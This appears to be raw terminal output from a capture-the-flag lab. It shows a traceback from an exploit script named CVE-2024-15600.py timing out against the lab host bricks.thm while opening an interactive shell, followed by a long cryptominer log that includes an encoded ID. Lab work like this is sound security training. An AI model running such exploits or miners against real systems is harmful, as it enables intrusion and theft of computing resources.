+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 190, in <module>
+    main()
+    ~~~~^^
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 183, in main
+    exploit(args.url)
+    ~~~~~~~^^^^^^^^^^
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 96, in exploit
+    interactive_shell(target, nonce)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 69, in interactive_shell
+    response = requests.post(target + vulnerable_path, headers=headers, json=vulnerable_data, verify=False, timeout=10)
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/api.py", line 134, in post
+    return request("post", url, data=data, json=json, **kwargs)
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/api.py", line 71, in request
+    return session.request(method=method, url=url, **kwargs)
+           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/sessions.py", line 651, in request
+    resp = self.send(prep, **send_kwargs)
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/sessions.py", line 784, in send
+    r = adapter.send(request, **kwargs)
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/adapters.py", line 742, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPSConnectionPool(host='bricks.thm', port=443): Read timed out. (read timeout=10)
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$
+2024-04-11 10:36:26,341 [*] Miner()
+2024-04-11 10:36:28,354 [*] Miner()
+2024-04-11 10:36:30,366 [*] Miner()
+2024-04-11 10:36:32,368 [*] Miner()
+2024-04-11 10:36:34,371 [*] Miner()
+2024-04-11 10:36:36,373 [*] Miner()
+2024-04-11 10:36:38,376 [*] Miner()
+2024-04-11 10:36:40,378 [*] Miner()
+2024-04-11 10:36:42,400 [*] Miner()
+2024-04-11 10:36:44,403 [*] Miner()
+2024-04-11 10:36:46,404 [*] Miner()
+2024-04-11 10:36:48,407 [*] Miner()
+2024-04-11 10:36:50,409 [*] Miner()
+2024-04-11 10:36:52,425 [*] Miner()
+2024-04-11 10:36:54,428 [*] Miner()
+2024-04-11 10:36:56,430 [*] Miner()
+2024-04-11 10:36:58,437 [*] Miner()
+2024-04-11 10:37:00,439 [*] Miner()
+2024-04-11 10:37:02,445 [*] Miner()
+2024-04-11 10:37:04,458 [*] Miner()
+2024-04-11 10:37:06,463 [*] Miner()
+2024-04-11 10:37:08,465 [*] Miner()
+2024-04-11 10:37:10,467 [*] Miner()
+2024-04-11 10:37:12,475 [*] Miner()
+2024-04-11 10:37:14,477 [*] Miner()
+2024-04-11 10:37:16,480 [*] Miner()
+2024-04-11 10:37:18,482 [*] Miner()
+2024-04-11 10:37:20,496 [*] Miner()
+2024-04-11 10:37:22,508 [*] Miner()
+2024-04-11 10:37:24,510 [*] Miner()
+2024-04-11 10:37:26,512 [*] Miner()
+2024-04-11 10:37:28,515 [*] Miner()
+2024-04-11 10:37:30,517 [*] Miner()
+2024-04-11 10:37:32,520 [*] Miner()
+2024-04-11 10:37:34,522 [*] Miner()
+2024-04-11 10:37:36,524 [*] Miner()
+2024-04-11 10:37:38,530 [*] Miner()
+2024-04-11 10:37:40,532 [*] Miner()
+2024-04-11 10:37:42,535 [*] Miner()
+2024-04-11 10:37:44,537 [*] Miner()
+2024-04-11 10:37:46,540 [*] Miner()
+2024-04-11 10:37:48,542 [*] Miner()
+2024-04-11 10:37:50,545 [*] Miner()
+2024-04-11 10:37:52,548 [*] Miner()
+2024-04-11 10:37:54,551 [*] Miner()
+2024-04-11 10:37:56,553 [*] Miner()
+2024-04-11 10:37:58,565 [*] Miner()
+2024-04-11 10:38:00,567 [*] Miner()
+2024-04-11 10:38:02,568 [*] Miner()
+2024-04-11 10:38:04,573 [*] Miner()
+2024-04-11 10:38:06,575 [*] Miner()
+2024-04-11 10:38:08,579 [*] Miner()
+2024-04-11 10:38:10,581 [*] Miner()
+2024-04-11 10:38:12,583 [*] Miner()
+2024-04-11 10:38:14,586 [*] Miner()
+2024-04-11 10:38:16,588 [*] Miner()
+2024-04-11 10:38:18,590 [*] Miner()
+2024-04-11 10:38:20,605 [*] Miner()
+2024-04-11 10:38:22,607 [*] Miner()
+2024-04-11 10:38:24,609 [*] Miner()
+2024-04-11 10:38:26,612 [*] Miner()
+2024-04-11 10:38:28,615 [*] Miner()
+2024-04-11 10:38:30,617 [*] Miner()
+2024-04-11 10:38:32,619 [*] Miner()
+2024-04-11 10:38:34,622 [*] Miner()
+2024-04-11 10:38:36,625 [*] Miner()
+2024-04-11 10:38:38,630 [*] Miner()
+2024-04-11 10:38:40,632 [*] Miner()
+2024-04-11 10:38:42,642 [*] Miner()
+2024-04-11 10:38:44,651 [*] Miner()
+2024-04-11 10:38:46,653 [*] Miner()
+2024-04-11 10:38:48,658 [*] Miner()
+2024-04-11 10:38:50,662 [*] Miner()
+2024-04-11 10:38:52,674 [*] Miner()
+2024-04-11 10:38:54,676 [*] Miner()
+2024-04-11 10:38:56,679 [*] Miner()
+2024-04-11 10:38:58,681 [*] Miner()
+2024-04-11 10:39:00,683 [*] Miner()
+2024-04-11 10:39:02,693 [*] Miner()
+2024-04-11 10:39:04,696 [*] Miner()
+2024-04-11 10:39:06,706 [*] Miner()
+2024-04-11 10:39:08,715 [*] Miner()
+2024-04-11 10:39:10,717 [*] Miner()
+2024-04-11 10:39:12,732 [*] Miner()
+2024-04-11 10:39:14,734 [*] Miner()
+2024-04-11 10:39:16,736 [*] Miner()
+2024-04-11 10:39:18,738 [*] Miner()
+2024-04-11 10:39:20,739 [*] Miner()
+2024-04-11 10:39:22,739 [*] Miner()
+2024-04-11 10:39:24,743 [*] Miner()
+2024-04-11 10:39:26,760 [*] Miner()
+2024-04-11 10:39:28,777 [*] Miner()
+2024-04-11 10:39:30,780 [*] Miner()
+2024-04-11 10:39:32,783 [*] Miner()
+2024-04-11 10:39:34,792 [*] Miner()
+2024-04-11 10:39:36,795 [*] Miner()
+2024-04-11 10:39:38,800 [*] Miner()
+2024-04-11 10:39:40,805 [*] Miner()
+2024-04-11 10:39:42,809 [*] Miner()
+2024-04-11 10:39:44,811 [*] Miner()
+2024-04-11 10:39:46,813 [*] Miner()
+2024-04-11 10:39:48,823 [*] Miner()
+2024-04-11 10:39:50,826 [*] Miner()
+2024-04-11 10:39:52,828 [*] Miner()
+2024-04-11 10:39:54,831 [*] Miner()
+2024-04-11 10:39:56,836 [*] Miner()
+2024-04-11 10:39:58,838 [*] Miner()
+2024-04-11 10:40:00,841 [*] Miner()
+2024-04-11 10:40:02,843 [*] Miner()
+2024-04-11 10:40:04,846 [*] Miner()
+2024-04-11 10:40:06,849 [*] Miner()
+2024-04-11 10:40:08,852 [*] Miner()
+2024-04-11 10:40:10,854 [*] Miner()
+2024-04-11 10:40:12,856 [*] Miner()
+2024-04-11 10:40:14,859 [*] Miner()
+2024-04-11 10:40:16,861 [*] Miner()
+2024-04-11 10:40:18,864 [*] Miner()
+2024-04-11 10:40:20,866 [*] Miner()
+2024-04-11 10:40:22,869 [*] Miner()
+2024-04-11 10:40:24,870 [*] Miner()
+2024-04-11 10:40:26,870 [*] Miner()
+2024-04-11 10:40:28,872 [*] Miner()
+2024-04-11 10:40:30,874 [*] Miner()
+2024-04-11 10:40:32,877 [*] Miner()
+2024-04-11 10:40:34,879 [*] Miner()
+2024-04-11 10:40:36,883 [*] Miner()
+2024-04-11 10:40:38,885 [*] Miner()
+2024-04-11 10:40:40,888 [*] Miner()
+2024-04-11 10:40:42,888 [*] Miner()
+2024-04-11 10:40:44,891 [*] Miner()
+2024-04-11 10:40:46,893 [*] Miner()
+2024-04-11 10:40:48,896 [*] Miner()
+2024-04-11 10:40:50,898 [*] Miner()
+2024-04-11 10:40:52,900 [*] Miner()
+2024-04-11 10:40:54,901 [*] Miner()
+2024-04-11 10:40:56,902 [*] Miner()
+2024-04-11 10:40:58,904 [*] Miner()
+2024-04-11 10:41:00,907 [*] Miner()
+2024-04-11 10:41:02,909 [*] Miner()
+2024-04-11 10:41:04,911 [*] Miner()
+2024-04-11 10:41:06,912 [*] Miner()
+2024-04-11 10:41:08,915 [*] Miner()
+2024-04-11 10:41:10,916 [*] Miner()
+2024-04-11 10:41:12,930 [*] Miner()
+2024-04-11 10:41:14,956 [*] Miner()
+2024-04-11 10:41:16,973 [*] Miner()
+2024-04-11 10:41:18,974 [*] Miner()
+2024-04-11 10:41:20,990 [*] Miner()
+2024-04-11 10:41:22,992 [*] Miner()
+2024-04-11 10:41:24,994 [*] Miner()
+2024-04-11 10:41:26,997 [*] Miner()
+2024-04-11 10:41:29,006 [*] Miner()
+2024-04-11 10:41:31,009 [*] Miner()
+2024-04-11 10:41:33,011 [*] Miner()
+2024-04-11 10:41:35,013 [*] Miner()
+2024-04-11 10:41:37,014 [*] Miner()
+2024-04-11 10:41:39,015 [*] Miner()
+2024-04-11 10:41:41,016 [*] Miner()
+2024-04-11 10:41:43,018 [*] Miner()
+2024-04-11 10:41:45,021 [*] Miner()
+2024-04-11 10:41:47,023 [*] Miner()
+2024-04-11 10:41:49,026 [*] Miner()
+2024-04-11 10:41:51,028 [*] Miner()
+2024-04-11 10:41:53,030 [*] Miner()
+2024-04-11 10:41:55,041 [*] Miner()
+2024-04-11 10:41:57,048 [*] Miner()
+2024-04-11 10:41:59,051 [*] Miner()
+2024-04-11 10:42:01,063 [*] Miner()
+2024-04-11 10:42:03,065 [*] Miner()
+2024-04-11 10:42:05,070 [*] Miner()
+2024-04-11 10:42:07,075 [*] Miner()
+2024-04-11 10:42:09,078 [*] Miner()
+2024-04-11 10:42:11,080 [*] Miner()
+2024-04-11 10:42:13,082 [*] Miner()
+2024-04-11 10:42:15,085 [*] Miner()
+2024-04-11 10:42:17,087 [*] Miner()
+2024-04-11 10:42:19,095 [*] Miner()
+2024-04-11 10:42:21,103 [*] Miner()
+2024-04-11 10:42:23,115 [*] Miner()
+2024-04-11 10:42:25,122 [*] Miner()
+2024-04-11 10:42:27,141 [*] Miner()
+2024-04-11 10:42:29,149 [*] Miner()
+2024-04-11 10:42:31,151 [*] Miner()
+2024-04-11 10:42:33,161 [*] Miner()
+2024-04-11 10:42:35,169 [*] Miner()
+2024-04-11 10:42:37,171 [*] Miner()
+2024-04-11 10:42:39,177 [*] Miner()
+2024-04-11 10:42:41,180 [*] Miner()
+2024-04-11 10:42:43,182 [*] Miner()
+2024-04-11 10:42:45,184 [*] Miner()
+2024-04-11 10:42:47,194 [*] Miner()
+2024-04-11 10:42:49,196 [*] Miner()
+2024-04-11 10:42:51,198 [*] Miner()
+2024-04-11 10:42:53,200 [*] Miner()
+2024-04-11 10:42:55,213 [*] Miner()
+2024-04-11 10:42:57,215 [*] Miner()
+2024-04-11 10:42:59,218 [*] Miner()
+2024-04-11 10:43:01,229 [*] Miner()
+2024-04-11 10:43:03,231 [*] Miner()
+2024-04-11 10:43:05,234 [*] Miner()
+2024-04-11 10:43:07,236 [*] Miner()
+2024-04-11 10:43:09,242 [*] Miner()
+2024-04-11 10:43:11,251 [*] Miner()
+2024-04-11 10:43:13,252 [*] Miner()
+2024-04-11 10:43:15,262 [*] Miner()
+2024-04-11 10:43:17,268 [*] Miner()
+2024-04-11 10:43:19,270 [*] Miner()
+2024-04-11 10:43:21,273 [*] Miner()
+2024-04-11 10:43:23,275 [*] Miner()
+2024-04-11 10:43:25,277 [*] Miner()
+2024-04-11 10:43:27,285 [*] Miner()
+2024-04-11 10:43:29,289 [*] Miner()
+2024-04-11 10:43:31,291 [*] Miner()
+2024-04-11 10:43:33,301 [*] Miner()
+2024-04-11 10:43:35,303 [*] Miner()
+2024-04-11 10:43:37,305 [*] Miner()
+2024-04-11 10:43:39,308 [*] Miner()
+2024-04-11 10:43:41,313 [*] Miner()
+2024-04-11 10:43:43,315 [*] Miner()
+2024-04-11 10:43:45,321 [*] Miner()
+2024-04-11 10:43:47,324 [*] Miner()
+2024-04-11 10:43:49,326 [*] Miner()
+2024-04-11 10:43:51,328 [*] Miner()
+2024-04-11 10:43:53,345 [*] Miner()
+2024-04-11 10:43:55,348 [*] Miner()
+2024-04-11 10:43:57,350 [*] Miner()
+2024-04-11 10:43:59,352 [*] Miner()
+2024-04-11 10:44:01,355 [*] Miner()
+2024-04-11 10:44:03,365 [*] Miner()
+2024-04-11 10:44:05,367 [*] Miner()
+2024-04-11 10:44:07,369 [*] Miner()
+2024-04-11 10:44:09,372 [*] Miner()
+2024-04-11 10:44:11,382 [*] Miner()
+2024-04-11 10:44:13,385 [*] Miner()
+2024-04-11 10:44:15,397 [*] Miner()
+2024-04-11 10:44:17,400 [*] Miner()
+2024-04-11 10:44:19,411 [*] Miner()
+2024-04-11 10:44:21,414 [*] Miner()
+2024-04-11 10:44:23,416 [*] Miner()
+2024-04-11 10:44:25,418 [*] Miner()
+2024-04-11 10:44:27,421 [*] Miner()
+2024-04-11 10:44:29,423 [*] Miner()
+2024-04-11 10:44:31,426 [*] Miner()
+2024-04-11 10:44:33,428 [*] Miner()
+2024-04-11 10:44:35,431 [*] Miner()
+2024-04-11 10:44:37,438 [*] Miner()
+2024-04-11 10:44:39,441 [*] Miner()
+2024-04-11 10:44:41,443 [*] Miner()
+2024-04-11 10:44:43,446 [*] Miner()
+2024-04-11 10:44:45,454 [*] Miner()
+2024-04-11 10:44:47,456 [*] Miner()
+2024-04-11 10:44:49,459 [*] Miner()
+2024-04-11 10:44:51,462 [*] Miner()
+2024-04-11 10:44:53,464 [*] Miner()
+2024-04-11 10:44:55,467 [*] Miner()
+2024-04-11 10:44:57,474 [*] Miner()
+2024-04-11 10:44:59,477 [*] Miner()
+2024-04-11 10:45:01,479 [*] Miner()
+2024-04-11 10:45:03,489 [*] Miner()
+2024-04-11 10:45:05,492 [*] Miner()
+2024-04-11 10:45:07,494 [*] Miner()
+2024-04-11 10:45:09,496 [*] Miner()
+2024-04-11 10:45:11,499 [*] Miner()
+2024-04-11 10:45:13,501 [*] Miner()
+2024-04-11 10:45:15,504 [*] Miner()
+2024-04-11 10:45:17,507 [*] Miner()
+2024-04-11 10:45:19,509 [*] Miner()
+2024-04-11 10:45:21,512 [*] Miner()
+2024-04-11 10:45:23,512 [*] Miner()
+2024-04-11 10:45:25,515 [*] Miner()
+2024-04-11 10:45:27,517 [*] Miner()
+2024-04-11 10:45:29,520 [*] Miner()
+2024-04-11 10:45:31,522 [*] Miner()
+2024-04-11 10:45:33,524 [*] Miner()
+2024-04-11 10:45:35,527 [*] Miner()
+2024-04-11 10:45:37,529 [*] Miner()
+2024-04-11 10:45:39,532 [*] Miner()
+2024-04-11 10:45:41,534 [*] Miner()
+2024-04-11 10:45:43,536 [*] Miner()
+2024-04-11 10:45:45,539 [*] Miner()
+2024-04-11 10:45:47,541 [*] Miner()
+2024-04-11 10:45:49,543 [*] Miner()
+2024-04-11 10:45:51,546 [*] Miner()
+2024-04-11 10:45:53,548 [*] Miner()
+2024-04-11 10:45:55,551 [*] Miner()
+2024-04-11 10:45:57,553 [*] Miner()
+2024-04-11 10:45:59,556 [*] Miner()
+2024-04-11 10:46:01,559 [*] Miner()
+2024-04-11 10:46:03,561 [*] Miner()
+2024-04-11 10:46:05,563 [*] Miner()
+2024-04-11 10:46:07,566 [*] Miner()
+2024-04-11 10:46:09,568 [*] Miner()
+2024-04-11 10:46:11,571 [*] Miner()
+2024-04-11 10:46:13,573 [*] Miner()
+2024-04-11 10:46:15,575 [*] Miner()
+2024-04-11 10:46:17,578 [*] Miner()
+2024-04-11 10:46:19,580 [*] Miner()
+2024-04-11 10:46:21,583 [*] Miner()
+2024-04-11 10:46:23,585 [*] Miner()
+2024-04-11 10:46:25,588 [*] Miner()
+2024-04-11 10:46:27,590 [*] Miner()
+2024-04-11 10:46:29,599 [*] Miner()
+2024-04-11 10:46:31,602 [*] Miner()
+2024-04-11 10:46:33,608 [*] Miner()
+2024-04-11 10:46:35,610 [*] Miner()
+2024-04-11 10:46:37,613 [*] Miner()
+2024-04-11 10:46:39,636 [*] Miner()
+2024-04-11 10:46:41,643 [*] Miner()
+2024-04-11 10:46:43,650 [*] Miner()
+2024-04-11 10:46:45,663 [*] Miner()
+2024-04-11 10:46:47,665 [*] Miner()
+2024-04-11 10:46:49,668 [*] Miner()
+2024-04-11 10:46:51,680 [*] Miner()
+2024-04-11 10:46:53,682 [*] Miner()
+2024-04-11 10:46:55,690 [*] Miner()
+2024-04-11 10:46:57,692 [*] Miner()
+2024-04-11 10:46:59,694 [*] Miner()
+2024-04-11 10:47:01,706 [*] Miner()
+2024-04-11 10:47:03,716 [*] Miner()
+2024-04-11 10:47:05,729 [*] Miner()
+2024-04-11 10:47:07,734 [*] Miner()
+2024-04-11 10:47:09,736 [*] Miner()
+2024-04-11 10:47:11,747 [*] Miner()
+2024-04-11 10:47:13,750 [*] Miner()
+2024-04-11 10:47:15,753 [*] Miner()
+2024-04-11 10:47:17,763 [*] Miner()
+2024-04-11 10:47:19,766 [*] Miner()
+2024-04-11 10:47:21,768 [*] Miner()
+2024-04-11 10:47:23,777 [*] Miner()
+2024-04-11 10:47:25,779 [*] Miner()
+2024-04-11 10:47:27,781 [*] Miner()
+2024-04-11 10:47:29,784 [*] Miner()
+2024-04-11 10:47:31,787 [*] Miner()
+2024-04-11 10:47:33,797 [*] Miner()
+2024-04-11 10:47:35,799 [*] Miner()
+2024-04-11 10:47:37,800 [*] Miner()
+2024-04-11 10:47:39,811 [*] Miner()
+2024-04-11 10:47:41,813 [*] Miner()
+2024-04-11 10:47:43,816 [*] Miner()
+2024-04-11 10:47:45,828 [*] Miner()
+2024-04-11 10:47:47,830 [*] Miner()
+2024-04-11 10:47:49,832 [*] Miner()
+2024-04-11 10:47:51,835 [*] Miner()
+2024-04-11 10:47:53,837 [*] Miner()
+2024-04-11 10:47:55,839 [*] Miner()
+2024-04-11 10:47:57,842 [*] Miner()
+2024-04-11 10:47:59,852 [*] Miner()
+2024-04-11 10:48:01,855 [*] Miner()
+2024-04-11 10:48:03,867 [*] Miner()
+2024-04-11 10:48:05,870 [*] Miner()
+2024-04-11 10:48:07,872 [*] Miner()
+2024-04-11 10:48:09,886 [*] Miner()
+2024-04-11 10:48:11,888 [*] Miner()
+2024-04-11 10:48:13,890 [*] Miner()
+2024-04-11 10:48:15,904 [*] Miner()
+2024-04-11 10:48:17,912 [*] Miner()
+2024-04-11 10:48:19,939 [*] Miner()
+2024-04-11 10:48:21,940 [*] Miner()
+2024-04-11 10:48:23,946 [*] Miner()
+2024-04-11 10:48:25,949 [*] Miner()
+2024-04-11 10:48:27,951 [*] Miner()
+2024-04-11 10:48:29,954 [*] Miner()
+2024-04-11 10:48:31,957 [*] Miner()
+2024-04-11 10:48:33,959 [*] Miner()
+2024-04-11 10:48:35,971 [*] Miner()
+2024-04-11 10:48:37,978 [*] Miner()
+2024-04-11 10:48:39,981 [*] Miner()
+2024-04-11 10:48:41,989 [*] Miner()
+2024-04-11 10:48:43,991 [*] Miner()
+2024-04-11 10:48:45,994 [*] Miner()
+2024-04-11 10:48:47,999 [*] Miner()
+2024-04-11 10:48:50,008 [*] Miner()
+2024-04-11 10:48:52,010 [*] Miner()
+2024-04-11 10:48:54,012 [*] Miner()
+2024-04-11 10:48:56,015 [*] Miner()
+2024-04-11 10:48:58,017 [*] Miner()
+2024-04-11 10:49:00,019 [*] Miner()
+2024-04-11 10:49:02,023 [*] Miner()
+2024-04-11 10:49:04,026 [*] Miner()
+2024-04-11 10:49:06,028 [*] Miner()
+2024-04-11 10:49:08,031 [*] Miner()
+2024-04-11 10:49:10,036 [*] Miner()
+2024-04-11 10:49:12,038 [*] Miner()
+2024-04-11 10:49:14,041 [*] Miner()
+2024-04-11 10:49:16,043 [*] Miner()
+2024-04-11 10:49:18,046 [*] Miner()
+2024-04-11 10:49:20,048 [*] Miner()
+2024-04-11 10:49:22,051 [*] Miner()
+2024-04-11 10:49:24,061 [*] Miner()
+2024-04-11 10:49:26,068 [*] Miner()
+2024-04-11 10:49:28,070 [*] Miner()
+2024-04-11 10:49:30,073 [*] Miner()
+2024-04-11 10:49:32,075 [*] Miner()
+2024-04-11 10:49:34,077 [*] Miner()
+2024-04-11 10:49:36,080 [*] Miner()
+2024-04-11 10:49:38,082 [*] Miner()
+2024-04-11 10:49:40,085 [*] Miner()
+2024-04-11 10:49:42,087 [*] Miner()
+2024-04-11 10:49:44,089 [*] Miner()
+2024-04-11 10:49:46,092 [*] Miner()
+2024-04-11 10:49:48,094 [*] Miner()
+2024-04-11 10:49:50,096 [*] Miner()
+2024-04-11 10:49:52,100 [*] Miner()
+2024-04-11 10:49:54,103 [*] Miner()
+2024-04-11 10:49:56,105 [*] Miner()
+2024-04-11 10:49:58,107 [*] Miner()
+2024-04-11 10:50:00,110 [*] Miner()
+2024-04-11 10:50:02,116 [*] Miner()
+2024-04-11 10:50:04,120 [*] Miner()
+2024-04-11 10:50:06,123 [*] Miner()
+2024-04-11 10:50:08,125 [*] Miner()
+2024-04-11 10:50:10,128 [*] Miner()
+2024-04-11 10:50:12,130 [*] Miner()
+2024-04-11 10:50:14,133 [*] Miner()
+2024-04-11 10:50:16,135 [*] Miner()
+2024-04-11 10:50:18,137 [*] Miner()
+2024-04-11 10:50:20,140 [*] Miner()
+2024-04-11 10:50:22,142 [*] Miner()
+2024-04-11 10:50:24,145 [*] Miner()
+2024-04-11 10:50:26,147 [*] Miner()
+2024-04-11 10:50:28,148 [*] Miner()
+2024-04-11 10:50:30,151 [*] Miner()
+2024-04-11 10:50:32,154 [*] Miner()
+2024-04-11 10:50:34,156 [*] Miner()
+2024-04-11 10:50:36,159 [*] Miner()
+2024-04-11 10:50:38,161 [*] Miner()
+2024-04-11 10:50:40,164 [*] Miner()
+2024-04-11 10:50:42,167 [*] Miner()
+2024-04-11 10:50:44,168 [*] Miner()
+2024-04-11 10:50:46,171 [*] Miner()
+2024-04-11 10:50:48,173 [*] Miner()
+2024-04-11 10:50:50,176 [*] Miner()
+2024-04-11 10:50:52,178 [*] Miner()
+2024-04-11 10:50:54,180 [*] Miner()
+2024-04-11 10:50:56,183 [*] Miner()
+2024-04-11 10:50:58,184 [*] Miner()
+2024-04-11 10:51:00,188 [*] Miner()
+2024-04-11 10:51:02,190 [*] Miner()
+2024-04-11 10:51:04,193 [*] Miner()
+2024-04-11 10:51:06,195 [*] Miner()
+2024-04-11 10:51:08,197 [*] Miner()
+2024-04-11 10:51:10,200 [*] Miner()
+2024-04-11 10:51:12,202 [*] Miner()
+2024-04-11 10:51:14,205 [*] Miner()
+2024-04-11 10:51:16,207 [*] Miner()
+2024-04-11 10:51:18,217 [*] Miner()
+2024-04-11 10:51:20,219 [*] Miner()
+2024-04-11 10:51:22,221 [*] Miner()
+2024-04-11 10:51:24,229 [*] Miner()
+2024-04-11 10:51:26,231 [*] Miner()
+2024-04-11 10:51:28,234 [*] Miner()
+2024-04-11 10:51:30,244 [*] Miner()
+2024-04-11 10:51:32,246 [*] Miner()
+2024-04-11 10:51:34,249 [*] Miner()
+2024-04-11 10:51:36,251 [*] Miner()
+2024-04-11 10:51:38,254 [*] Miner()
+2024-04-11 10:51:40,261 [*] Miner()
+2024-04-11 10:51:42,263 [*] Miner()
+2024-04-11 10:51:44,266 [*] Miner()
+2024-04-11 10:51:46,268 [*] Miner()
+2024-04-11 10:51:48,274 [*] Miner()
+2024-04-11 10:51:50,276 [*] Miner()
+2024-04-11 10:51:52,278 [*] Miner()
+2024-04-11 10:51:54,281 [*] Miner()
+2024-04-11 10:51:56,283 [*] Miner()
+2024-04-11 10:51:58,288 [*] Miner()
+2024-04-11 10:52:00,292 [*] Miner()
+2024-04-11 10:52:02,292 [*] Miner()
+2024-04-11 10:52:04,300 [*] Miner()
+2024-04-11 10:52:06,314 [*] Miner()
+2024-04-11 10:52:08,316 [*] Miner()
+2024-04-11 10:52:10,330 [*] Miner()
+2024-04-11 10:52:12,333 [*] Miner()
+2024-04-11 10:52:14,346 [*] Miner()
+2024-04-11 10:52:16,348 [*] Miner()
+2024-04-11 10:52:18,350 [*] Miner()
+2024-04-11 10:52:20,352 [*] Miner()
+2024-04-11 10:52:22,355 [*] Miner()
+2024-04-11 10:52:24,356 [*] Miner()
+2024-04-11 10:52:26,359 [*] Miner()
+2024-04-11 10:52:28,361 [*] Miner()
+2024-04-11 10:52:30,375 [*] Miner()
+2024-04-11 10:52:32,377 [*] Miner()
+2024-04-11 10:52:34,379 [*] Miner()
+2024-04-11 10:52:36,382 [*] Miner()
+2024-04-11 10:52:38,384 [*] Miner()
+2024-04-11 10:52:40,393 [*] Miner()
+2024-04-11 10:52:42,395 [*] Miner()
+2024-04-11 10:52:44,401 [*] Miner()
+2024-04-11 10:52:46,404 [*] Miner()
+2024-04-11 10:52:48,414 [*] Miner()
+2024-04-11 10:52:50,416 [*] Miner()
+2024-04-11 10:52:52,419 [*] Miner()
+2024-04-11 10:52:54,421 [*] Miner()
+2024-04-11 10:52:56,431 [*] Miner()
+2024-04-11 10:52:58,433 [*] Miner()
+2024-04-11 10:53:00,444 [*] Miner()
+2024-04-11 10:53:02,447 [*] Miner()
+2024-04-11 10:53:04,453 [*] Miner()
+2024-04-11 10:53:06,455 [*] Miner()
+2024-04-11 10:53:08,457 [*] Miner()
+2024-04-11 10:53:10,465 [*] Miner()
+2024-04-11 10:53:12,467 [*] Miner()
+2024-04-11 10:53:14,470 [*] Miner()
+2024-04-11 10:53:16,472 [*] Miner()
+2024-04-11 10:53:18,474 [*] Miner()
+2024-04-11 10:53:20,477 [*] Miner()
+2024-04-11 10:53:22,488 [*] Miner()
+2024-04-11 10:53:24,491 [*] Miner()
+2024-04-11 10:53:26,493 [*] Miner()
+2024-04-11 10:53:28,496 [*] Miner()
+2024-04-11 10:53:30,498 [*] Miner()
+2024-04-11 10:53:32,500 [*] Miner()
+2024-04-11 10:53:34,503 [*] Miner()
+2024-04-11 10:53:36,504 [*] Miner()
+2024-04-11 10:53:38,508 [*] Miner()
+2024-04-11 10:53:40,510 [*] Miner()
+2024-04-11 10:53:42,518 [*] Miner()
+2024-04-11 10:53:44,524 [*] Miner()
+2024-04-11 10:53:46,527 [*] Miner()
+2024-04-11 10:53:48,529 [*] Miner()
+2024-04-11 10:53:50,532 [*] Miner()
+2024-04-11 10:53:52,534 [*] Miner()
+2024-04-11 10:53:54,546 [*] Miner()
+2024-04-11 10:53:56,559 [*] Miner()
+2024-04-11 10:53:58,574 [*] Miner()
+2024-04-11 10:54:00,576 [*] Miner()
+2024-04-11 10:54:02,579 [*] Miner()
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2025-11-01 15:36:36,211 [*] confbak: Ready!
+2025-11-01 15:36:36,211 [*] Status: Mining!
+2025-11-01 15:36:40,214 [*] Miner()
+2025-11-01 15:36:40,214 [*] Bitcoin Miner Thread Started
+2025-11-01 15:36:40,214 [*] Status: Mining!
+2025-11-01 15:36:42,216 [*] Miner()
+2025-11-01 15:36:44,218 [*] Miner()
+2025-11-01 15:36:46,220 [*] Miner()
+2025-11-01 15:36:48,222 [*] Miner()
+2025-11-01 15:36:50,224 [*] Miner()
+2025-11-01 15:36:52,226 [*] Miner()
+2025-11-01 15:36:54,228 [*] Miner()
+2025-11-01 15:36:56,230 [*] Miner()
+2025-11-01 15:36:58,232 [*] Miner()
+2025-11-01 15:37:00,234 [*] Miner()
+2025-11-01 15:37:02,236 [*] Miner()
+2025-11-01 15:37:03,835 [*] Miner()
+2025-11-01 15:37:05,837 [*] Miner()
+2025-11-01 15:37:07,839 [*] Miner()
+2025-11-01 15:37:09,841 [*] Miner()
+2025-11-01 15:37:11,843 [*] Miner()
+2025-11-01 15:37:13,845 [*] Miner()
+2025-11-01 15:37:15,847 [*] Miner()
+2025-11-01 15:37:17,849 [*] Miner()
+2025-11-01 15:37:19,852 [*] Miner()
+2025-11-01 15:37:21,854 [*] Miner()
+2025-11-01 15:37:23,856 [*] Miner()
+2025-11-01 15:37:25,859 [*] Miner()
+2025-11-01 15:37:27,861 [*] Miner()
+2025-11-01 15:37:29,863 [*] Miner()
+2025-11-01 15:37:31,866 [*] Miner()
+2025-11-01 15:37:33,868 [*] Miner()
+2025-11-01 15:37:35,870 [*] Miner()
+2025-11-01 15:37:37,873 [*] Miner()
+2025-11-01 15:37:39,875 [*] Miner()
+2025-11-01 15:37:41,877 [*] Miner()
+2025-11-01 15:37:43,879 [*] Miner()
+2025-11-01 15:37:45,881 [*] Miner()
+2025-11-01 15:37:47,884 [*] Miner()
+2025-11-01 15:37:49,886 [*] Miner()
+2025-11-01 15:37:51,893 [*] Miner()
+2025-11-01 15:37:53,901 [*] Miner()
+2025-11-01 15:37:55,903 [*] Miner()
+2025-11-01 15:37:57,917 [*] Miner()
+2025-11-01 15:37:59,924 [*] Miner()
+2025-11-01 15:38:01,936 [*] Miner()
+2025-11-01 15:38:03,939 [*] Miner()
+2025-11-01 15:38:05,941 [*] Miner()
+2025-11-01 15:38:07,944 [*] Miner()
+2025-11-01 15:38:09,953 [*] Miner()
+2025-11-01 15:38:11,955 [*] Miner()
+2025-11-01 15:38:13,958 [*] Miner()
+2025-11-01 15:38:15,960 [*] Miner()
+2025-11-01 15:38:17,963 [*] Miner()
+2025-11-01 15:38:19,965 [*] Miner()
+2025-11-01 15:38:21,968 [*] Miner()
